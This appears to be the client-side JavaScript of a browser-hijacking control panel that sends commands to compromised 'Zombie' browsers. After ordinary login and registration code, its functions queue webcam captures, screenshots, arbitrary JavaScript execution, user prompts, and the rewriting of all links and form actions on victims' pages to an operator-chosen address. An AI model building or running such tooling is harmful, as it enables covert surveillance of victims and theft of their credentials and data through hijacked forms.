 var RecaptchaOptions = {
    theme : 'blackglass'
 };
 
function restore_background(element) {
	$(element).animate({left: '-20%'}, 1000, 'easeInElastic', function () {
		$(element).css('display', 'none');
	});
	$("#backdrop").fadeOut(1000, function() {});
}
function fade_background(element) {
	$("#backdrop").click(function(){
		restore_background(element);
	});
	$("#backdrop").fadeIn(700, function() {
		$(element).css('display','block');
		$(element).animate({left: '50%'}, 1000, 'easeOutElastic');
	});
}

function display_image(img) {
	$("#backdrop").fadeIn(700, function() {
		alert('lol');
	});
}

function display_div(element) {
	$(element).css('display', 'block');
}

function change_to_login() {
	$("#backdrop").unbind('click');
	$('#registerposi').animate({left: '-20%'}, 1000, 'easeInElastic', function () {
		$('#registerposi').css('display','none');
		setTimeout(function() {
			$('#loginposi').css('display','block');
			$('#message').html('Your account has been registered!<br>An email has been sent to you.<br>You must verify your email to login.');
			$('#loginposi').animate({left: '50%'}, 1000, 'easeOutElastic', function () {
				$("#backdrop").click(function(){
					restore_background("#loginposi");
				});
			});
		}, 1000);
	});
}

function login_ajax() {
	var username = escape(document.getElementById("username").value);
	var password = escape(document.getElementById("password").value);
	var remember = escape(document.getElementById("rememberme").checked);
	$.ajax({
		type: "POST",
		url: "./ajax/login.php",
		data: {username:username, password:password, rememberme:remember, login:""}
	}).done(function(result) {
		$('#message').html(result);
		$('#username').val('');
		$('#password').val('');
	});
	return false;
}
function register_ajax() {
	$("#loadimage").css('display','block');
	var username = escape(document.getElementById("rusername").value);
	var password = escape(document.getElementById("rpassword").value);
	var password2 = escape(document.getElementById("password2").value);
	var email = escape(document.getElementById("email").value);
	var recapcf = escape(document.getElementById("recaptcha_challenge_field").value);
	var recaprf = escape(document.getElementById("recaptcha_response_field").value);
	
	$.ajax({
		type: "POST",
		url: "./ajax/register.php",
		data: {username:username, password:password, password2:password2, email:email, recaptcha_challenge_field:recapcf, recaptcha_response_field:recaprf, register:""}
	}).done(function(result) {
		if(result == 'All fields must be filled out!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
		}
		if(result == 'The username you chose already exists!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rusername').val('');
			$('#rpassword').val('');
			$('#password2').val('');
		}
		if(result == 'You already have an account registered!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rusername').val('');
			$('#rpassword').val('');
			$('#password2').val('');
			$('#email').val('');
		}
		if(result == 'The passwords you entered do not match!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rpassword').val('');
			$('#password2').val('');
		}
		if(result == 'You must enter a valid email!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rpassword').val('');
			$('#password2').val('');
			$('#email').val('');
		}
		if(result == 'The answer to the captcha was incorrect!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rpassword').val('');
			$('#password2').val('');
		}
		if(result == 'Your account has been registered!') {
			$('#rmessage').html(result);
			$("#loadimage").css('display','none');
			$('#rmessage').html('');
			$('#rusername').val('');
			$('#rpassword').val('');
			$('#password2').val('');
			$('#email').val('');
			change_to_login();
		}
		Recaptcha.reload();
	});
	return false;
}

function generate_modal(title, body, buttonlabel, onclickfunc) {
    $('.modal-title').html(title);
    $('.modal-body').html(body);
    $('.btn-default').html(buttonlabel);
    $('#modalButton').attr('onclick', onclickfunc);
    $('#modal').modal('show');
}
function create_webcam_command(uid, zid) {
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {create_webcam_command:"", uid:uid, zid:zid}
	}).done(function(result) {
		if(result) {
			generate_modal('Take Webcam Picture', 'Webcam command was sent to Zombie.<br><br>Note: Zombie must confirm webcam prompt before picture is taken.<br>Check Zombie logs for response.', 'Close', 'return false;');
		}
	});
}
function execute_custom_js(uid, zid) {
	var js = $('#custom_js').val();
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {execute_custom_js:"", uid:uid, zid:zid, custom_js:js}
	}).done(function(result) {
		if(result) {
			setTimeout(function(){ generate_modal('Execute Custom Javascript', 'Custom Javascript command was sent to Zombie', 'Close', 'return false;'); }, 1500);
		}
	});
}
function prompt_zombie(uid, zid) {
	var text = $('#prompt_text').val();
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {prompt_zombie:"", uid:uid, zid:zid, prompt_text:text}
	}).done(function(result) {
		if(result) {
			setTimeout(function(){ generate_modal('Prompt Zombie', 'Prompt was sent to Zombie.<br>Check logs for response from Zombie.', 'Close', 'return false;'); }, 1500);
		}
	});
}

function create_screenshot_command(uid, zid) {
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {create_screenshot_command:"", uid:uid, zid:zid}
	}).done(function(result) {
		if(result) {
			generate_modal('Take Screenshot', 'Screenshot command was sent to Zombie.<br><br>This uses html2canvas to render a screenshot of Zombies current page.<br>Check Zombie logs for response.', 'Close', 'return false;');
		}
	});
}

function replace_all_links(uid, zid) {
	var linklocation = $('#link_location').val();
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {replace_all_links:"", uid:uid, zid:zid, link_location:linklocation}
	}).done(function(result) {
		if(result) {
			setTimeout(function(){ generate_modal('Replace All Links', 'Replace all links command was sent to Zombie<br>HREF attribute values of all a tags will be changed to '+linklocation, 'Close', 'return false;'); }, 1500);
		}
	});
}

function replace_all_form_actions(uid, zid) {
	var linklocation = $('#link_location').val();
	$.ajax({
		type: "POST",
		url: "./ajax/create_commands.php",
		data: {replace_all_form_actions:"", uid:uid, zid:zid, link_location:linklocation}
	}).done(function(result) {
		if(result) {
			setTimeout(function(){ generate_modal('Replace All Form Actions', 'Replace all form actions command was sent to Zombie<br>Action attribute values of all form tags will be changed to '+linklocation, 'Close', 'return false;'); }, 1500);
		}
	});
}